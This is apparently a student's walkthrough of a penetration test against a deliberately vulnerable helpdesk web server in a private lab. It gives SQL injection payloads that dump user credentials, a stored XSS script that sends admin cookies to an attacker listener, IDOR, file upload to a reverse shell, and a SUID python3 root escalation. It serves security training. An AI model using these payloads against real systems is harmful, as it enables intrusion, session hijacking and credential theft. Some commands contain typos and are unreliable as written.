# Web Server
>[!info] For specifications refer to [[Lab Configuration Notes]].
### Reconnaissance
<span style='color:red'> *** There would be no reconnaissance conducted within the web server/lab activity.</span>

---
### Scanning
#### Part 1: Network Scan
1. The malicious actor to issue host discovery on the targeted network - 192.168.1.0/24. 
```bash
sudo nmap 192.168.1.0/24
```
2. ==nmap== would return with the following results once the scan is completed.
   ![[initial nmap scan.png]]
3. From the nmap scan, the malicious actor can determine that service/port 80, 443 is running on 192.168.1.151 which is believed to be the website.
#### Part 2: Web Directory Enumeration
1. The malicious actor can use directory busting tools like ==gobuster/dirbuster== to enumerate the directory to find hidden paths. 
2. ```bash
   gobuster dir -u http://192.168.1.151 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
   ```
   ![[gobuster scan.png]]
3. From the completed scan output of gobuster, the attacker can identify the interesting files like robots.txt and /uploads directory.
>[!tip] robots.txt is a file which instructs the web crawlers of which files to not crawl. 

---
### Gaining Access
![[login page.png]]
1. The malicious actor would conduct a SQLi attack on the [[login.php|login form]] - username field given that they have no credentials. (Theoretically it should work if the attacker typed the correct command.)
> [!tip] MariaDB requires a space after the two -- in order to count them as a comment. 
2. ```bash
   ' ' OR 1=1--  
   ```
3. Should the SQLi attack succeed, the actor would have logon to the web server and landed in [[dashboard.php]] with the first user in the database. Zhi Xuan in this case.
### Exploitation 

#### Vulnerability 1: SQLi Attack

Within [[dashboard.php]] there is an input field which allows the actor to conduct and test for SQLi attack.

The actor is to attempt to search for a single ticket within the search bar - which would invoke [[query_ticket.php]].
If the actor were to conduct a simple SQLi attack like `1' OR 1=1-- `, the web server would automatically catch the SQLi attempt and return a error "malicious input". However the actor can try other variants of SQLi attack like time based or union based attacks.

When a ticket is queried successfully it'll return the table columns. The table columns would be returned regardless if the 'searched ticket' is active or not. 

As there are a total of 5 columns returned in [[query_ticket.php]], the actor would try enumerate the actual total columns queried via the SQL statement with the exploit of `
`ORDER BY {number}` 
```sql
1 ORDER BY 6
```

Anything above 5 column would results in a crash, hence the actor is aware that the total column queried is 5. The actor would try the following to test their theory and check if it's working. 
```Sql
1 UNION SELECT 1,2,3,4,5,6
```

The results printed out the numbers in order, verifying that the SQLi attack had worked. The actor would start enumerating the database to find out the database, version_name, user, tables within the database.

Finding the actual table name (database), version of the SQLi server and the logged on user.
``` sql
100 UNION SELECT database(), version(), user(), 4,5,6-- 
```

Enumerating tables
```sql
100 UNION SELECT 1,schema_name, 3,4,5,6 FROM information_schema.schemata-- 
```

Dumping the tables within 'palessi_helpdesk' database.
```sql
100 UNION SELECT 1,table_name,3,4,5,6 FROM information_schema.tables WHERE table_schema='palessi_helpdesk'
```

Dumping the fields within 'users' table
```sql
100 UNION SELECT 1,GROUP_CONCAT(column_name SEPARATOR ', '),3,4,5,6 FROM information_schema.columns WHERE table_schema='palessi_helpdesk' AND table_name='users'
```

Dumping the username and password
```sql
100 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR '<br>'),3,4,5,6 FROM palessi_helpdesk.users
```

---
#### Vulnerability 2: Cross Site Scripting (XSS) - Stored

The actor would create a ticket within the navbar - directing to [[create_ticket.php]]. 
In order for the stored #Cross-Site-Scripting  to work, the actor verifies that the page is a http-POST form. (View Source Code).

The actor is allowed to enter XSS code into any of the input fields which he can conduct session-hijacking or session-fixation attacks later wards. 

The actor is to create a ticket with any title and enter the malicious xss code within the description box as it does not sanitize and check for user inputs, so any code entered would not be escaped and executed on the web server. 

Actor to host a kali http server.

```bash
python3 -m htttp.server 8000
```

Malicious XSS code
```bash
<script>new Image.src=<"192.168.0.10/cookie=">+document.cookie</script>
```
>[!tip] You would receive a 404 error as there is no directory or anything named cookie. The IP might differ from my kali linux and yours, change it accordingly.

Once the ticket is created, an admin would review the ticket. The moment the administrator clicks on the ticket, the XSS would be executed and the PHPSESSID (PHP cookie) would be POSTED to the actor's listener on Kali. With the administrator's cookie, the actor can swap their own cookie for the actor's cookie, successfully conducting a session hijacking attack.
#### Vulnerability 3: IDOR
Broken access control #IDOR has been configured on the web server that allows any users to view any tickets within the ticketing system. This is also a example of broken access control.

#IDOR can be conducted by the actor through several ways. Either from the URL parameter when searching for a ticket in [[query_ticket.php]]. The actor can enumerate the "searched id".
```URL
http://192.168.1.151/query_ticket.php?search={id}
```

Alternatively, #IDOR can also be conducted on the search bar within [[dashboard.php]].

The actor can either enumerate through all the tickets or use SQLi attack to dump out the active ticket database. Specifically ticket #21 created by Chloe Sim, which consists of a password reset request being handled insecurely. The password obtained within ticket #11 would be the domain password for the domain user Chloe Sim. (low hanging fruit #low_hanging_fruit)

---
#### Vulnerability 4: CSRF
#to_be_added
#### Vulnerability 5: Local File Inclusion  / Path Traversal Attack

For LFI, the actor would use the the attack surface of [[create_ticket.php]] or [[view_ticket.php]]. Because #IDOR is misconfigured in the web server on purpose, the ticket does not need to belong to the attacker - the exploit would work on any <span style='color:green'>active</span> tickets. 

Within the [[view_ticket.php]] page, it shows the full conversation of the tickets, but the actor would be targeted the uploads section of the tickets as the web server does not employ any blacklisting/whitelisting of the files being uploaded. There are no file type restriction being configured on the web server nor the feature of automatically renaming the upload. 

From the [[#Part 2 Web Directory Enumeration]] phase, the actor discovered via robots.txt the existence of /uploads directory. To locate the uploaded file, the actor can either visit the /uploads directory where they would find all the uploaded files onto the server or they could click on the uploaded file on [[view_ticket.php]] which redirects them to the file that they've uploaded. This is possible because of `fetch()` instead of `readfile()`. 

---
#### Vulnerability 6: Remote Code Execution

Carrying over from [[#Vulnerability 5 Local File Inclusion / Path Traversal Attack]]. 

>[!info] php shell (RCE)
The actor can upload a simple .[[php shell]] file onto the web server for RCE and execute system enumeration commands like `whoami`, `id`, `iproute` onto the system. 

>[!info] reverse shell (RCE)
The actor can also upload a simple [[r_shell.php|reverse shell]] file obtained from [revshell](https://www.revshell.com)

>[!danger] Privilege Escalation

Once the actor maintains foothold of the web server, the actor would be greeted with a non-tty shell with the user: www-data

Check if it's a TTY shell 
>[!info] It'll show `not a tty`

Stabilising the shell
```bash
1. python3 -c 'import pty; pty.spawn("/bin/bash")';
   # Background the shell with Control+Z
2. stty raw -echo; fg
   # Press ENTER once or twice after 'fg' to get the reverse shell back.
3. export TERM=xterm
   # or export TERM=xterm-color256
```

Checking for SUID enabled bids on the victim #suid
```bash
find / -perm -4000 2>/dev/null
# This finds the entire file directory for any suid bids with u+s and redirects the error into 2>/dev/null
```

The results would show the misconfigured SUID bits: 
```bash
/usr/bin/python3
/usr/bin/find
# This can be confirmed with www.gtfobins.com to obtain a privilege shell

# We can double confirm the SUID bits to be set with 
ls -la /usr/bin/python3 
# -rwsr-xr-x 1 root root 7477160 Aug 20 18:41 /usr/bin/python3.14
ls -la /usr/bin/find
#-rwsr-xr-x 1 root root 216632 Feb  3  2026 /usr/bin/find
```


>[!danger] Obtaining root acces

```bash
# Works for both /usr/share/python and /usr/share/find 
python3 -c 'import os; os.setuid(0); os.setgid(0); os.execl("/bin/sh", "sh", "-p")'

#os.setuid(0) and os.setgid(0) is best practice incase the root shell falls back to a low-privilege user.
```
### Maintaining Access
<span style='color:red'>This phase would not be covered within the web server</span>
### Covering Tracks
<span style='color:red'>This phase would not be covered within the web server</span>
